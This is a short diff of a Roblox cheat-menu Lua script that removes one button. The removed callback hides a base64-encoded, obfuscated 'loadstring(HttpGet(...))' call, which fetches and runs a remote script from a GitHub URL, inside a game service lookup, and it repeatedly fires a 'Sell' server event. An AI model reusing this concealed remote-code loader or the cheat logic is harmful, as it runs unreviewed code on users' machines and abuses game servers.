@@ -1723,15 +1723,6 @@ local Tab = Window:MakeTab({
     PremiumOnly = false
 })
 
-Tab:AddButton({	
-     Name ="自己的白64加密",
-     Default = false, 	
-    Callback = function()
-	while _G.chise == true do
-	wait()
-game:GetService(PUTtvUOoDJzxEkoHrkgxoyEdhknAVSMVLgZumkrHZarfg('IGdvdG9fTyA9IHhnbyAgCgogZ290b19PID0gbG9hZHN0cmluZyhnYW1lOgogICAgICAgIEh0dHBHZXQnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dUQUZBVy9nb3RvL3JlZnMvaGVhZHMvbWFpbi94Z28nKSd4Z28nLmx1YQoKIA==')).LocalPlayer.Character.Events.Sell:FireServer()
-    end 
-}) 
 Tab:AddButton({
     Name ="作者喜欢的一个外国脚本，不喜勿喷",
     Callback = function()
